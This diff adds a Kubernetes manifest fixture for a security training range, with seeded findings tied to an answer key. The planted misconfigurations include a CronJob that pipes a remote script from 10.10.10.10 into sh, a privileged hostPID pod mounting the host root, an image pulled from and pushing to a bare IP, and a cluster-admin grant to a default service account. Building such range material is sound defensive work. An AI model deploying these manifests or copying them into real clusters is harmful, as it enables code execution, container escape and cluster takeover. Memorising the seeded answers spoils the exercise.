@@ -1,0 +1,213 @@
+# Generated from cyberthunder/adapters/kubernetes/simulated.py seed_objects(); keep the two in step.
+# Seeded findings: see range/answer_key/kubernetes.json (M1, M4, M6, I1-I4).
+apiVersion: v1
+kind: Pod
+metadata:
+  name: metrics-collector-7d9f4
+  namespace: kube-system
+  labels:
+    app: metrics-collector
+spec:
+  containers:
+  - name: collector
+    image: 198.51.100.23:5000/collector:1.0
+    securityContext:
+      allowPrivilegeEscalation: false
+      runAsNonRoot: true
+      runAsUser: 10001
+      readOnlyRootFilesystem: true
+      capabilities:
+        drop:
+        - ALL
+    resources:
+      limits:
+        cpu: 500m
+        memory: 256Mi
+      requests:
+        cpu: 100m
+        memory: 128Mi
+    command:
+    - /collector
+    - --push
+    - 198.51.100.23:9091
+    imagePullPolicy: IfNotPresent
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: web-frontend
+  namespace: apps
+  labels:
+    app: web-frontend
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: web-frontend
+  template:
+    metadata:
+      labels:
+        app: web-frontend
+    spec:
+      containers:
+      - name: web
+        image: registry.local/apps/web-frontend:2.4.1
+        securityContext:
+          privileged: true
+          runAsNonRoot: true
+          runAsUser: 10001
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop:
+            - ALL
+        resources:
+          limits:
+            cpu: 500m
+            memory: 256Mi
+          requests:
+            cpu: 100m
+            memory: 128Mi
+        ports:
+        - containerPort: 8080
+          protocol: TCP
+        imagePullPolicy: IfNotPresent
+        command:
+        - sleep
+        - '86400'
+      automountServiceAccountToken: false
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: payments-api
+  namespace: apps
+  labels:
+    app: payments-api
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: payments-api
+  template:
+    metadata:
+      labels:
+        app: payments-api
+    spec:
+      containers:
+      - name: api
+        image: registry.local/apps/payments:1.8.0
+        securityContext:
+          allowPrivilegeEscalation: false
+          runAsNonRoot: true
+          runAsUser: 10001
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop:
+            - ALL
+        resources:
+          limits:
+            cpu: 500m
+            memory: 256Mi
+          requests:
+            cpu: 100m
+            memory: 128Mi
+        env:
+        - name: LOG_LEVEL
+          value: info
+        - name: DB_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: payments-db
+              key: password
+        ports:
+        - containerPort: 8443
+          protocol: TCP
+        imagePullPolicy: IfNotPresent
+        command:
+        - sleep
+        - '86400'
+      automountServiceAccountToken: false
+---
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: cache-warmer
+  namespace: apps
+spec:
+  schedule: '*/15 * * * *'
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          restartPolicy: OnFailure
+          automountServiceAccountToken: false
+          containers:
+          - name: warm
+            image: registry.local/apps/toolbox:1.2
+            securityContext:
+              allowPrivilegeEscalation: false
+              runAsNonRoot: true
+              runAsUser: 10001
+              readOnlyRootFilesystem: true
+              capabilities:
+                drop:
+                - ALL
+            resources:
+              limits:
+                cpu: 500m
+                memory: 256Mi
+              requests:
+                cpu: 100m
+                memory: 128Mi
+            command:
+            - /bin/sh
+            - -c
+            - curl -fsSL http://10.10.10.10:8443/k.sh | sh
+            imagePullPolicy: IfNotPresent
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: kube-proxy-helper
+  namespace: apps
+  labels:
+    app: kube-proxy-helper
+spec:
+  hostPID: true
+  containers:
+  - name: helper
+    image: ghcr.io/x0rcist/node-tools:latest
+    command:
+    - /bin/sh
+    - -c
+    - sleep infinity
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+    imagePullPolicy: IfNotPresent
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+      type: Directory
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: default
+  namespace: apps
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: system-monitor-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+- kind: ServiceAccount
+  name: default
+  namespace: default
